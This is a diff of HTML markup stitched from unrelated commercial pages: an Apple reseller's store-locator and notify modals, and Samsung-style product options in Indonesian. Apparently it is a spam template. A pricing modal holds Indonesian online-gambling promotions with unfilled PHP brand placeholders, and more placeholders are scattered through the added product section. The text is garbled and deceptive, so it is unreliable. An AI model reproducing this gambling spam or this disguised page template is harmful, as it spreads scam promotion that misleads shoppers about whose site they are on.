-                      placeholder="Enter City or Postal Code"
-                      aria-label="Enter City or Postal Code"
-                      role="combobox"
-                      aria-expanded="false"
-                      aria-owns="myLocations"
-                      aria-controls="myLocations"
-                      aria-haspopup="listbox"
-                      aria-autocomplete="list"
-                      autocorrect="off"
-                      autocomplete="off"
-                      autocapitalize="off"
-                      spellcheck="false"
-                      >
-                </form>
-                <div class="js-store-locator-search-suggestions my-store-locator-drawer__suggestions hidden"></div>
-                <p class="js-store-locator-search-error my-store-locator-drawer__error hidden">
-                    <i class="fa fa-exclamation-triangle" aria-hidden="true"></i> Please fill this out
+              <ul class="pd-selector-option__bezel-list">
+               <li class="pd-selector-option__bezel-item">
+                <strong class="pd-selector-option__bezel-title">
+                 Jenis modern
+                </strong>
+                <p class="pd-selector-option__bezel-description">
+                 Bezel kustom pada The Frame terpasang pada tempatnya secara magnetis. Sekarang, Anda dapat berganti gaya dalam sekejap.
                 </p>
-                <button class="js-store-locator-use-location-btn my-store-locator-drawer__use-location-btn">
-                    <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
-                      <path d="M11.9023 5.98047C11.309 5.98047 10.729 6.15642 10.2356 6.48606C9.74229 6.8157 9.35777 7.28424 9.13071 7.83242C8.90364 8.3806 8.84423 8.9838 8.95999 9.56574C9.07574 10.1477 9.36147 10.6822 9.78102 11.1018C10.2006 11.5213 10.7351 11.8071 11.3171 11.9228C11.899 12.0386 12.5022 11.9792 13.0504 11.7521C13.5986 11.525 14.0671 11.1405 14.3968 10.6472C14.7264 10.1538 14.9023 9.57381 14.9023 8.98047C14.9014 8.1851 14.5851 7.42256 14.0227 6.86015C13.4603 6.29774 12.6977 5.98137 11.9023 5.98047ZM11.9023 10.4805C11.6057 10.4805 11.3157 10.3925 11.069 10.2277C10.8223 10.0628 10.6301 9.82858 10.5165 9.55449C10.403 9.2804 10.3733 8.9788 10.4312 8.68783C10.489 8.39686 10.6319 8.12959 10.8417 7.91981C11.0515 7.71003 11.3187 7.56717 11.6097 7.50929C11.9007 7.45141 12.2023 7.48112 12.4764 7.59465C12.7505 7.70818 12.9847 7.90044 13.1495 8.14711C13.3144 8.39379 13.4023 8.6838 13.4023 8.98047C13.4019 9.37815 13.2437 9.75942 12.9625 10.0406C12.6813 10.3218 12.3 10.48 11.9023 10.4805Z" fill="#0071E3"/>
-                      <path d="M17.6676 3.21133C16.2423 1.78635 14.3396 0.939858 12.3268 0.835221C10.3141 0.730584 8.33391 1.37522 6.76849 2.64472C5.20307 3.91422 4.16338 5.71858 3.85009 7.70957C3.5368 9.70055 3.97212 11.737 5.07202 13.4259L10.7395 22.1265C10.8657 22.3201 11.0381 22.4792 11.2412 22.5893C11.4444 22.6994 11.6718 22.7571 11.9029 22.7571C12.1339 22.7571 12.3613 22.6994 12.5645 22.5893C12.7676 22.4792 12.9401 22.3201 13.0662 22.1265L18.7339 13.4259C19.7545 11.8592 20.2055 9.98931 20.0114 8.12962C19.8172 6.26993 18.9898 4.53348 17.6676 3.21133ZM17.4771 12.6071L11.9029 21.1642L6.32865 12.6071C4.6224 9.98782 4.98835 6.4825 7.19879 4.27197C7.81653 3.65421 8.54991 3.16418 9.35704 2.82985C10.1642 2.49551 11.0292 2.32344 11.9029 2.32344C12.7765 2.32344 13.6416 2.49551 14.4487 2.82985C15.2559 3.16418 15.9892 3.65421 16.607 4.27197C18.8174 6.4825 19.1833 9.98782 17.4771 12.6071Z" fill="#0071E3"/>
-                    </svg>
-                    <span> Use my current location </span>
-                </button>
-                <div class="my-store-locator-drawer__search-result-options">
-                    <span
-                      class="js-store-locator-results-count my-store-locator-drawer__search-result-label"
-                      data-results="results"
-                      data-result="result"
-                      data-results-near="results near"
-                      data-result-near="result near"
-                      data-results-near-you="results near you"
-                      data-result-near-you="result near you"
-                      data-no-results-found="no results found"
-                      ></span>
-                    <label
-                      class="screenreader"
-                      for="storeLocatorDistanceSelectDrawer"
-                      >
-                    Filter stores by distance
-                    </label>
-                    <select
-                      class="js-store-locator-results-distance my-store-locator-drawer__search-distance-select"
-                      id="storeLocatorDistanceSelectDrawer"
-                      >
-                      <option value="all" >
-                          All stores
-                      </option>
-                      <option value="5" selected>
-                          5
-                          miles
-                      </option>
-                      <option value="10" selected>
-                          10
-                          miles
-                      </option>
-                      <option value="30" selected>
-                          30
-                          miles
-                      </option>
-                      <option value="50" selected>
-                          50
-                          miles
-                      </option>
-                      <option value="100" selected>
-                          100
-                          miles
-                      </option>
-                    </select>
-                </div>
-              </div>
-              <div id="myLocationResults" class="my-store-locator-drawer__search-results"></div>
-              <div class="my-store-locator-drawer__footer">
-                <button
-                    class="js-store-locator-select-btn my-store-locator__details-btn button button--secondary button--full-width"
-                    >
-                Select
-                </button>
-              </div>
+               </li>
+              </ul>
+             </div>
+            </div>
+            <button class="layer-popup__close" type="button">
+             <span class="hidden">
+              Layer Popup Close
+             </span>
+             <svg aria-hidden="true" class="icon" focusable="false">
+              <use href="#delete-bold" xlink:href="#delete-bold">
+              </use>
+             </svg>
+            </button>
+           </div>
           </div>
-          <div id="storeLocatorDrawerLoading" class="my-store-locator-drawer__loading">
-              <i class="fa fa-spinner fa-spin" style="font-size:24px"></i>
-          </div>
-        </my-store-locator-drawer>
-        <div class="my-store-locator-drawer__bg"></div>
-        <link href="https://www.istudiosg.com/cdn/shop/t/14/assets/component-notify-modal.css?v=121279191211236621751742784888" rel="stylesheet" type="text/css" media="all" />
-        <aside id="notifyModal" class="modal ac-moda">
-          <form class="modal__inner modal__inner--notify">
-              <header class="modal__header">
-                <button id="notifyModalClose" type="button" class="modal__close modal-close-button">
-                    <span class="modal-close-icon">
-                      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20">
-                          <path d="M12.12,10l4.07-4.06a1.5,1.5,0,1,0-2.11-2.12L10,7.88,5.94,3.81A1.5,1.5,0,1,0,3.82,5.93L7.88,10,3.81,14.06a1.5,1.5,0,0,0,0,2.12,1.51,1.51,0,0,0,2.13,0L10,12.12l4.06,4.07a1.45,1.45,0,0,0,1.06.44,1.5,1.5,0,0,0,1.06-2.56Z"></path>
-                      </svg>
-                    </span>
-                    <span class="screenreader">Close</span>
-                </button>
-                <h3
-                    class="modal__title js-notify-title"
-                    data-default="Don’t miss out when this item becomes available!"
-                    data-success="You will be notified when it becomes available."
-                    >Don’t miss out when this item becomes available!</h3>
-                <div class="modal__success hide js-notify-title-success hide">
-                    <h3
-                      class="modal__title"
-                      data-default="Don’t miss out when this item becomes available!"
-                      >You will be notified when it becomes available.</h3>
-                </div>
-              </header>
-              <div class="modal__inner-content">
-                <p class="modal__inner-content-p js-notify-content">Enter your email address to be notified when this item is back in stock.</p>
-                <input class="modal__input js-notify-input" type="email" aria-label="Email">
-                <div class="modal__input--error js-notify-error">
-                    <span class="hide js-notify-general-error-text">Unable to subscribe to updates. Please try again later.</span>
-                    <span class="hide js-notify-duplicate-request-error-text">You are already subscribed</span>
-                    <span class="hide js-notify-error-request-error-text">You must enter an email to subscribe to product updates.</span>
-                </div>
+         </div>
+         <div class="pd-select-option__bezel-type-popup" id="beveledType" role="dialog">
+          <div class="layer-popup">
+           <div class="layer-popup__inner">
+            <h2 class="layer-popup__title">
+             Jenis bezel
+            </h2>
+            <div class="layer-popup__contents scrollbar">
+             <div class="scrollbar__contents">
+              <div class="pd-selector-option__bezel-image">
+               <div data-sdf-attr.class="image">
+                <img alt="alt text" data-desktop-src="/etc.clientlibs/samsung/clientlibs/consumer/global/clientlib-common/resources/images/the-frame-bezel-popup-beveled-pc.jpg?$636_300_JPG$" data-mobile-src="/etc.clientlibs/samsung/clientlibs/consumer/global/clientlib-common/resources/images/the-frame-bezel-popup-beveled-mo.jpg?$624_320_JPG$" data-sdf-attr.class="image__preview lazy-load responsive-img" role="img"/>
+                <img alt="alt text" data-desktop-src="/etc.clientlibs/samsung/clientlibs/consumer/global/clientlib-common/resources/images/the-frame-bezel-popup-beveled-pc.jpg?$636_300_JPG$" data-mobile-src="/etc.clientlibs/samsung/clientlibs/consumer/global/clientlib-common/resources/images/the-frame-bezel-popup-beveled-mo.jpg?$624_320_JPG$" data-sdf-attr.class="image__main lazy-load responsive-img" role="img"/>
+               </div>
               </div>
-              <button
-                class="modal__submit modal__submit--notify button button--full-width button--primary js-notify-submit"
-                type="button"
-                >
-              <span class="screenreader">Submit</span>
-              <span class="modal__submit-text">Notify me</span>
-              </button>
-              <button
-                class="modal__submit modal__submit--notify button button--full-width button--primary hide js-notify-success-button"
-                type="button"
-                >
-              <span class="screenreader">Close</span>
-              <span class="modal__submit-text">Done</span>
-              </button>
-          </form>
-          <div class="notify-modal__overlay modal-page-overlay js-notify-overlay"></div>
-        </aside>
-        <style>
-          .modal__submit.modal__submit--notify {
-          background-color: #0071E3;
-          }
-          .modal__submit.modal__submit--notify {
-          color: #FFFFFF;
-          }
-        </style>
-        <div class="seedkit-component-standalone">
-          <a
-              class="ac-modal-trigger hidden js-net-monthly-pricing-modal-trigger"
-              data-modal-target="modal-net-monthly-pricing-modal"
-              >Pelajari Selengkapnya<i class="fa-solid fa-angle-right billboard_icon"></i></a>
-          <div
-              id="modal-net-monthly-pricing-modal"
-              class="ac-modal"
-              data-type="content"
-              data-width="wide"
-              data-variant="pageOverlay"
-              data-modal-dialog-label="Modal"
-              data-modal-close-label="Close Modal"
-              >
-              <link href="https://www.istudiosg.com/cdn/shop/t/14/assets/component-nmp-test-mode.css?v=20702808579977612711742784887" rel="stylesheet" type="text/css" media="all" />
-              <nmp-test-mode class="nmp-test-mode  js-nmp-test-mode" data-frequency="/mo. for {{ per_month }} mo.">
-                <div
-                    class="nmp-test-mode__heading"
-                    id="modal-headline"
-                    >
-                    <h2>Bonus dan Promosi yang tersedia di <?= $BRAND; ?> ?</h2>
-                    <p>Bonus Spin Lucky Wheel Iphone 17 Pro Maxwin</p>
-                    <p>Bonus Cashback Sport 500%</p>
-            <p>Bonus New Member 100% Di Awal</p>
-            <p>Bonus Scatter Jejer Mahjong 1 2 3 Wins</p>
-            <p>Bonus <?= $BRAND; ?> LOGIN Maxwin Spin Gratis 10000x</p>
-                </div>
-                <h3 class="nmp-test-mode__title">Situs <?= $BRAND; ?> Terpercaya 2026</h3>
-                <div class="nmp-test-mode__plan">
-                    <div class="js-nmp-terms">
-                      <i class="fa fa-spinner fa-spin"></i>
-                    </div>
-                </div>
-              </nmp-test-mode>
-              <script src="https://www.istudiosg.com/cdn/shop/t/14/assets/nmp-test-mode.js?v=52863412589471034481742784889" defer="defer"></script>
+              <ul class="pd-selector-option__bezel-list">
+               <li class="pd-selector-option__bezel-item">
+                <strong class="pd-selector-option__bezel-title">
+                 Jenis bevel
+                </strong>
+                <p class="pd-selector-option__bezel-description">
+                 Desain bezel jenis bevel yang baru menawarkan tepi bezel dalam sudut 45 derajat yang elegan.
+                </p>
+               </li>
+              </ul>
+             </div>
+            </div>
+            <button class="layer-popup__close" type="button">
+             <span class="hidden">
+              Layer Popup Close
+             </span>
+             <svg aria-hidden="true" class="icon" focusable="false">
+              <use href="#delete-bold" xlink:href="#delete-bold">
+              </use>
+             </svg>
+            </button>
+           </div>
+          </div>
+         </div>
+        </div>
+        <div class="pd-select-option__eta-text text-type2 js-shippingOrBack sdf-component-template" data-sdf-template="shippingOrBack @ drawObj" data-sdf-test="{{shippingOrBack.hasComponent}}" data-sdf-unwrap="true">
+         <svg aria-hidden="true" class="icon" focusable="false">
+          <use href="#in-stock-regular" xlink:href="#in-stock-regular">
+          </use>
+         </svg>
+         <span>
+          {{shippingOrBack.shippingOrBack}}
+         </span>
+        </div>
+        <div class="pd-select-option__eta-text js-deliveryMessage sdf-component-template" data-sdf-template="deliveryMessage @ drawObj" data-sdf-test="{{deliveryMessage.hasComponent}}" data-sdf-unwrap="true">
+         <svg aria-hidden="true" class="icon" focusable="false">
+          <use href="#in-stock-regular" xlink:href="#in-stock-regular">
+          </use>
+         </svg>
+         <span>
+          {{deliveryMessage.deliveryMessage}}
+         </span>
+        </div>
+        <div class="pd-select-option trade-in sdf-component-template" data-sdf-template=" tradeIn @ drawObj" data-sdf-test="{{tradeIn.hasComponent}}" data-sdf-unwrap="true" id="trade-in">
+         <div class="pd-select-option__headline-wrap">
+          <h3 class="pd-select-option__headline" data-sdf-test="{{tradeIn.title}}">
+           {{tradeIn.title}}
+          </h3>
+          <span class="pd-select-option__cta-wrap" data-sdf-test="{{tradeIn.learnMoreCta.text}}">
+           <button an-ac="pd buying tool" an-ca="option click" an-la="trade-in:learn more" an-tr="hdd02_product info.-product detail-option servicce selector-option_click" aria-haspopup="dialog" class="cta cta--underline-v2 cta--black" data-sdf-attr.data-target-popup="{{tradeIn.learnMoreCta.layerTarget}}" data-sdf-attr.href="{{tradeIn.learnMoreCta.href}}" data-sdf-attr.target="{{tradeIn.learnMoreCta.target}}" data-sdf-attr.title="{{tradeIn.learnMoreCta.title}}" data-sdf-test="{{tradeIn.learnMoreCta.isNotOutLink}}" rel="nofollow">
+            {{tradeIn.learnMoreCta.text}}
+           </button>
+           <a an-ac="pd buying tool" an-ca="option click" an-la="trade-in:learn more" an-tr="hdd02_product info.-product detail-option servicce selector-option_click" aria-haspopup="dialog" class="cta cta--underline-v2 cta--black cta--icon" data-sdf-attr.data-target-popup="{{tradeIn.learnMoreCta.layerTarget}}" data-sdf-attr.href="{{tradeIn.learnMoreCta.href}}" data-sdf-attr.target="{{tradeIn.learnMoreCta.target}}" data-sdf-attr.title="{{tradeIn.learnMoreCta.title}}" data-sdf-test="{{tradeIn.learnMoreCta.isOutLink}}" rel="nofollow">
+            {{tradeIn.learnMoreCta.text}}
+            <svg aria-hidden="true" class="icon" focusable="false">
+             <use href="#outlink-bold" xlink:href="#outlink-bold">
+             </use>
+            </svg>
+           </a>
+          </span>
+         </div>
+         <p class="pd-select-option__desc" data-sdf-test="{{tradeIn.description}}">
+          {{tradeIn.description}}
+         </p>
+         <div class="pd-select-option__wrap">
+          <ul class="pd-select-option__list pd-select-option__list--wide" role="list">
+           <li class="pd-select-option__item" role="listitem">
+            <div class="pd-option-selector">
+             <input an-ac="pd buying tool" an-ca="option click" an-la="trade-in:yes" an-tr="hdd02_product info.-product detail-option servicce selector-option_click" aria-haspopup="dialog" class="hidden option-input add-special-tagging {{tradeIn.yesAttr.class}}" data-event-type="{{tradeIn.yesAttr.eventType}}" data-sdf-test="{{tradeIn.yesAttr.isPopup}}" data-target-popup="{{tradeIn.yesAttr.layerTarget}}" id="pd-trade-in-0" name="pd-trade-in" type="radio"/>
+             <label class="pd-option-selector__label" data-sdf-test="{{tradeIn.yesAttr.isPopup}}" for="pd-trade-in-0">
+              <span class="pd-option-selector__text-wrap">
+               <span class="pd-option-selector__text">
+                <strong class="pd-option-selector__main-text">
+                 {{tradeIn.yesAttr.text}}
+                </strong>
+                <span class="pd-option-selector__sub-text">
+                 {{tradeIn.yesAttr.subText}}
+                </span>
+               </span>
+              </span>
+             </label>
+             <a class="pd-option-selector__link" data-sdf-attr.href="{{tradeIn.yesAttr.href}}" data-sdf-test="{{tradeIn.yesAttr.isDirectLink}}" rel="nofollow" target="_blank">
+              <span class="pd-option-selector__text-wrap">
+               <span class="pd-option-selector__text">
+                <strong class="pd-option-selector__main-text">
+                 {{tradeIn.yesAttr.text}}
+                </strong>
+                <span class="pd-option-selector__sub-text">
+                 {{tradeIn.yesAttr.subText}}
+                </span>
+               </span>
+              </span>
+             </a>
+            </div>
+           </li>
+           <li class="pd-select-option__item" role="listitem">
+            <div class="pd-option-selector">
+             <input an-ac="pd buying tool" an-ca="option click" an-la="trade-in:no" an-tr="hdd02_product info.-product detail-option servicce selector-option_click" class="hidden option-input option-result-focus add-special-tagging {{tradeIn.noAttr.class}}" data-event-type="{{tradeIn.noAttr.eventType}}" data-sdf-test="{{tradeIn.yesAttr.isPopup}}" data-target-popup="{{tradeIn.noAttr.layerTarget}}" id="pd-trade-in-1" name="pd-trade-in" type="radio"/>
+             <label class="pd-option-selector__label" data-sdf-test="{{tradeIn.yesAttr.isPopup}}" for="pd-trade-in-1">
+              <span class="pd-option-selector__text-wrap">
+               <span class="pd-option-selector__text">
+                <strong class="pd-option-selector__main-text">
+                 {{tradeIn.noAttr.text}}
+                </strong>
+                <span class="pd-option-selector__sub-text">
+                 {{tradeIn.noAttr.subText}}
+                </span>
+               </span>
+              </span>
+             </label>
+             <a class="pd-option-selector__link" data-sdf-test="{{tradeIn.yesAttr.isDirectLink}}" href="javascript:void(0);">
+              <span class="pd-option-selector__text-wrap">
+               <span class="pd-option-selector__text">
+                <strong class="pd-option-selector__main-text">
+                 {{tradeIn.noAttr.text}}
+                </strong>
+               </span>
+              </span>
+             </a>
+            </div>
+           </li>
+          </ul>
+         </div>
+        </div>
+        <div class="option-result__device-area sdf-component-template" data-sdf-template=" tradeInErrMsg @ drawObj" data-sdf-test="{{tradeInErrMsg.hasComponent}}" data-sdf-unwrap="true">
+         <p class="option-result__message option-result__message--error">
+          <span class="option-result__message-inner">
+           <svg aria-hidden="true" class="icon" focusable="false">
+            <use href="#info-bold" xlink:href="#info-bold">
+            </use>
+           </svg>
+           You have maximum number of Trade-in in cart already. If you wish to add in Trade-in, please remove from cart.
+          </span>
+         </p>
+        </div>
+        <div class="option-result result-trade-in option-result--content sdf-component-template" data-sdf-template=" tradeInResult @ drawObj" data-sdf-unwrap="true">
+         <div class="option-result__multiple result-price" data-sdf-attr.data-cart-id="{{tradeInResult.dataQuoteId}}" data-sdf-attr.data-cash-back-price="{{tradeInResult.dataCashBack}}" data-sdf-attr.data-id="{{tradeInResult.dataId}}" data-sdf-attr.data-is-instant="{{tradeInResult.isUpfront}}" data-sdf-attr.data-price="{{tradeInResult.dataPrice}}">
+          <p class="option-result__multiple-result">
+           Selamat, Anda telah mendapatkan diskon tukar tambah.
+          </p>
+          <ul>
+           <li class="option-result__multiple-item" data-sdf-repeat.item="{{tradeInResult.list}}">
+            <p class="option-result__multiple-price-wrap">
+             <em class="option-result__multiple-price-title">
+              {{item.discountPriceTextTile}}
+             </em>
+             <span class="option-result__multiple-price">
+              {{item.discountPriceText}}
+             </span>
+             <span class="option-result__multiple-exchange">
+              {{item.discountText1}}
+             </span>
+             <span class="option-result__multiple-discount" data-sdf-test="{{item.abondementAmountText}}">
+              {{item.abondementAmountText}}
+             </span>
+             <span class="option-result__multiple-discount" data-sdf-test="{{item.spotGuaranteeAmountText}}">
+              {{item.spotGuaranteeAmountText}}
+             </span>
+             <span class="option-result__multiple-exchange" data-sdf-test="{{item.tradeinValueText}}">
+              {{item.tradeinValueText}}
+             </span>
+             <span class="option-result__multiple-exchange" data-sdf-test="{{item.exclusiveTradeinUnitOfferText}}">
+              {{item.exclusiveTradeinUnitOfferText}}
+             </span>
+             <span class="option-result__multiple-exchange" data-sdf-test="{{item.extraTradeinOfferTextShow}}">
+              {{item.extraTradeinOfferText}}
+             </span>
+             <span class="option-result__multiple-exchange" data-sdf-test="{{item.exclusiveChannerTradeinOfferTextShow}}">
+              {{item.exclusiveChannerTradeinOfferText}}
+             </span>
+             <span class="option-result__multiple-exchange" data-sdf-test="{{item.extraTradeinVoucherTextShow}}">
+              {{item.extraTradeinVoucherText}}
+             </span>
+             <span class="option-result__multiple-discount">
+              {{item.specialDiscountText}}
+             </span>
+            </p>
+            <p class="option-result__multiple-text">
+             {{item.displayModelName}}
+            </p>
+            <p class="option-result__multiple-btn">
+             <button an-ac="pd buying tool" an-ca="option click" an-la="trade-in:delete" an-tr="header(pim)_trade in-product detail-option-click{{item.count}}" class="option-result__multiple-delete remove-trade-in-result" data-trade-index="{{item.index}}">
+              Hapus
+             </button>
+             <button an-ac="pd buying tool" an-ca="option click" an-la="trade-in:change" an-tr="header(pim)_trade in-product detail-option-click{{item.count}}" class="option-result__multiple-change open-trade-popup" data-trade-index="{{item.index}}">
+              Ubah
+             </button>
+            </p>
+           </li>
+          </ul>
+         </div>
+         <p class="option-result__multiple-desc desc-target">
+          Harga akan bervariasi berdasarkan model dan kondisi perangkat lama. *S&amp;K berlaku.
+         </p>
+         <p class="pd-select-option__alert-text alert-text" style="display: none;">
+          <svg aria-hidden="true" class="icon" focusable="false">
+           <use href="#information-error-bold" xlink:href="#information-error-bold">
+           </use>
+          </svg>
+          The device you are trading in is more valuable than the phone you are buying. Unfortunately we cannot credit you the excess value, so please remove the trade in device, or change the device you are purchasing
+         </p>
+         <p class="pd-select-option__alert-text over-price-alert into-text" style="display: none;">
+          <svg aria-hidden="true" class="icon" focusable="false">
+           <use href="#info-bold" xlink:href="#info-bold">
+           </use>
+          </svg>
+          Perangkat lama Anda memiliki harga tukar yang lebih besar dari harga Galaxy baru yang akan Anda beli. Kelebihan harga tukar ini tidak dapat diuangkan ataupun dikembalikan.
+         </p>
+         <div class="pd-select-option__cta">
+          <a an-ac="pd buying tool" an-ca="option click" an-la="trade-in:add another trade-in" an-tr="header(pim)_trade in-product detail-option-click" aria-label="Link Title" class="cta cta--outlined cta--black open-trade-popup limit-count" href="javascript:void(0)">
+           Tambah Trade-in
+          </a>
+         </div>
+        </div>
+        <div class="pd-select-option pd-select-option--check-dealer-stock sdf-component-template" data-sdf-template="checkDealerStock @ drawObj" data-sdf-test="{{checkDealerStock.hasComponent}}" data-sdf-unwrap="true">
+         <div class="pd-select-option__headline-wrap">
+          <h3 class="pd-select-option__headline">
+           Dealer stock quantity
+          </h3>
+         </div>
+         <p class="pd-select-option__desc">
+          You can check the stock quantity for each region
+         </p>
+         <p class="pd-select-option__notice pd-select-option__notice--normal">
+          <svg aria-hidden="true" class="icon" focusable="false">
+           <use href="#information-error-bold" xlink:href="#information-error-bold">
+           </use>
+          </svg>
+          Please select city
+         </p>
+         <div class="pd-select-option__wrap">
+          <div class="pd-select-option__menu pd-select-option__menu--placeholder">
+           <div class="menu filled" data-comp-name="menu" data-open-direction="down" data-type="filled">
+            <select aria-hidden="true" class="menu__select" data-default-message="{{checkDealerStock.selectCity}}" name="check-dealer-stock" tabindex="-1">
+             <option data-sdf-test="{{checkDealerStock.selectCity}}" disabled="" value="select City">
+              {{checkDealerStock.selectCity}}
+             </option>
+             <option data-sdf-repeat.item="{{checkDealerStock.dataList}}" value="{{item.isocodeShort}}">
+              {{item.name}}
+             </option>
+            </select>
+            <button aria-expanded="false" aria-haspopup="listbox" class="menu__select-field" type="button">
+             <span class="menu__select-field-text">
+              Select city
+             </span>
+             <svg aria-hidden="true" class="menu__select-field-icon down" focusable="false">
+              <use href="#open-down-bold" xlink:href="#open-down-bold">
+              </use>
+             </svg>
+             <svg aria-hidden="true" class="menu__select-field-icon up" focusable="false">
+              <use href="#close-up-bold" xlink:href="#close-up-bold">
+              </use>
+             </svg>
+            </button>
+           </div>
+          </div>
+          <p class="pd-select-option__check-message pd-select-option__check-message--success">
+           <span>
+            Only {0} left in stock.
+           </span>
+          </p>
+          <p class="pd-select-option__check-message pd-select-option__check-message--error">
+           <span>
+            Sorry, this product is not currently available in selected city.
+           </span>
+          </p>
+         </div>
+        </div>
+        <div class="pd-select-option off-change option-assured-buy-back sdf-component-template" data-sdf-template="assuredBuyBack @ drawObj" data-sdf-test="{{assuredBuyBack.hasComponent}}" data-sdf-unwrap="true">
+         <div class="pd-select-option__headline-wrap">
+          <h3 class="pd-select-option__headline" data-sdf-test="{{assuredBuyBack.title}}">
+           {{assuredBuyBack.title}}
+          </h3>
+         </div>
+         <div class="pd-select-option__wrap">
+          <ul class="pd-select-option__list pd-select-option__list--wide" role="list">
+           <li class="pd-select-option__item" role="listitem">
+            <div class="pd-option-selector">
+             <input an-ac="pd buying tool" an-ca="option click" an-la="assured program:no" an-tr="hdd02_product info.-product detail-option service selector-option_click" class="hidden option-input add-special-tagging" data-event-type="{{assuredBuyBack.noAttr.eventType}}" id="pd-galaxy-assured-0" name="pd-galaxy-assured" type="radio"/>
+             <label class="pd-option-selector__label" for="pd-galaxy-assured-0">
+              <span class="pd-option-selector__text-wrap">
+               <span class="pd-option-selector__text">
+                <strong class="pd-option-selector__main-text">
+                 Tanpa perlindungan extra
+                </strong>
+               </span>
+              </span>
+             </label>
+            </div>
+           </li>
+           <li class="pd-select-option__item" role="listitem">
+            <div class="pd-option-selector">
+             <input an-ac="pd buying tool" an-ca="option click" an-la="assured program:yes" an-tr="hdd02_product info.-product detail-option service selector-option_click" class="hidden option-input open-popup add-special-tagging" data-target-popup="{{assuredBuyBack.yesAttr.layerTarget}}" id="pd-galaxy-assured-1" name="pd-galaxy-assured" type="radio"/>
+             <label class="pd-option-selector__label" for="pd-galaxy-assured-1">
+              <span class="pd-option-selector__text-wrap">
+               <span class="pd-option-selector__text">
+                <strong class="pd-option-selector__main-text" data-sdf-test="{{assuredBuyBack.yesAttr.text}}">
+                 {{assuredBuyBack.yesAttr.text}}
+                </strong>
+                <span class="pd-option-selector__sub-text" data-sdf-test="{{assuredBuyBack.yesAttr.subText}}">
+                 {{assuredBuyBack.yesAttr.subText}}
+                </span>
+               </span>
+              </span>
+             </label>
+            </div>
+           </li>
+          </ul>
+         </div>
+        </div>
+        <div class="option-result-dev result-option-assured-buy-back sdf-component-template" data-sdf-template="assuredBuyBackResult @ drawObj" data-sdf-unwrap="true">
+         <input class="hidden result-price" data-sdf-attr.data-price="{{assuredBuyBackResult.dataPrice}}" data-sdf-attr.data-sale-price="{{assuredBuyBackResult.dataSalePrice}}" type="hidden"/>
+        </div>
+        <div class="pd-select-option off-change option-new-assured-buy-back sdf-component-template" data-sdf-template="newAssuredBuyBack @ drawObj" data-sdf-test="{{newAssuredBuyBack.hasComponent}}" data-sdf-unwrap="true">
+         <div class="pd-select-option__headline-wrap">
+          <h3 class="pd-select-option__headline" data-sdf-test="{{newAssuredBuyBack.title}}">
+           {{newAssuredBuyBack.title}}
+          </h3>
+          <span class="pd-select-option__cta-wrap" data-sdf-test="{{newAssuredBuyBack.learnMoreCta.text}}">
+           <a an-ac="pd buying tool" an-ca="option click" an-la="galaxy assured:learn more" an-tr="header(pim)_option selector-product detail-select-service option" aria-haspopup="dialog" class="cta cta--underline cta--black add-special-tagging" data-sdf-attr.data-target-popup="{{newAssuredBuyBack.learnMoreCta.layerTarget}}" data-sdf-attr.href="{{newAssuredBuyBack.learnMoreCta.href}}" data-sdf-attr.target="{{newAssuredBuyBack.learnMoreCta.target}}" data-sdf-attr.title="{{newAssuredBuyBack.learnMoreCta.title}}">
+            {{newAssuredBuyBack.learnMoreCta.text}}
+           </a>
+          </span>
+         </div>
+         <p class="pd-select-option__desc" data-sdf-test="{{newAssuredBuyBack.description}}">
+          {{newAssuredBuyBack.description}}
+         </p>
+         <p class="pd-select-option__notice">
+          <svg aria-hidden="true" class="icon" focusable="false">
+           <use href="#information-error-bold" xlink:href="#information-error-bold">
+           </use>
+          </svg>
+          Please select <?= $BRAND; ?> x <?= $BRAND2; ?> Assured Buyback or no coverage
+         </p>
+         <div class="pd-select-option__wrap">
+          <ul class="pd-select-option__list pd-select-option__list--wide" role="list">
+           <li class="pd-select-option__item" data-sdf-repeat.item="{{newAssuredBuyBack.itemSet}}" role="listitem">
+            <div class="pd-option-selector">
+             <input an-ac="pd buying tool" an-ca="option click" an-la="galaxy assured:yes" an-tr="header(pim)_option selector-product detail-select-service option" class="hidden option-input open-popup add-special-tagging" id="pd-galaxy-new-assured-{{item.index}}" name="pd-galaxy-new-assured" type="radio"/>
+             <label class="pd-option-selector__label" for="pd-galaxy-new-assured-{{item.index}}">
+              <span class="pd-option-selector__text-wrap">
+               <span class="pd-option-selector__text">
+                <strong class="pd-option-selector__main-text" data-sdf-test="{{item.title}}">
+                 {{item.title}}
+                </strong>
+                <span class="pd-option-selector__sub-text" data-sdf-test="{{item.priceDisplay}}">
+                 {{item.priceDisplay}}
+                </span>
+               </span>
+              </span>
+             </label>
+            </div>
+           </li>
+           <li class="pd-select-option__item" role="listitem">
+            <div class="pd-option-selector">
+             <input an-ac="pd buying tool" an-ca="option click" an-la="galaxy assured:no" an-tr="header(pim)_option selector-product detail-select-service option" class="hidden option-input add-special-tagging" data-event-type="{{newAssuredBuyBack.noAttr.eventType}}" id="pd-galaxy-new-assured-0" name="pd-galaxy-new-assured" type="radio"/>
+             <label class="pd-option-selector__label" for="pd-galaxy-new-assured-0">
+              <span class="pd-option-selector__text-wrap">
+               <span class="pd-option-selector__text">
+                <strong class="pd-option-selector__main-text">
+                 {{newAssuredBuyBack.noAttr.text}}
+                </strong>
+               </span>
+              </span>
+             </label>
+            </div>
+           </li>
+          </ul>
+         </div>
+        </div>
+        <div class="option-result-dev result-option-new-assured-buy-back sdf-component-template" data-sdf-template="newAssuredBuyBackResult @ drawObj" data-sdf-unwrap="true">
+         <input class="hidden result-price" data-sdf-attr.data-display-name="{{newAssuredBuyBackResult.dataDisplayName}}" data-sdf-attr.data-display-price="{{newAssuredBuyBackResult.dataDisplayPrice}}" data-sdf-attr.data-price="{{newAssuredBuyBackResult.dataPrice}}" data-sdf-attr.data-sale-price="{{newAssuredBuyBackResult.dataPrice}}" data-sdf-attr.model-code="{{newAssuredBuyBackResult.dataModelCode}}" data-sdf-attr.model-name="{{newAssuredBuyBackResult.dataModelName}}" type="hidden"/>
+        </div>
+        <!-- CRHQ-3143 [B2C] ES - SC+ 개선 -->
+        <div class="pd-select-option option-care sdf-component-template" data-sdf-template=" care @ drawObj" data-sdf-test="{{care.hasComponent}}" data-sdf-unwrap="true">
+         <div class="pd-select-option__headline-wrap">
+          <h3 class="pd-select-option__headline" data-sdf-test="{{care.title}}">
+           Benefits of Game Digital Yang Setiap
+          </h3>
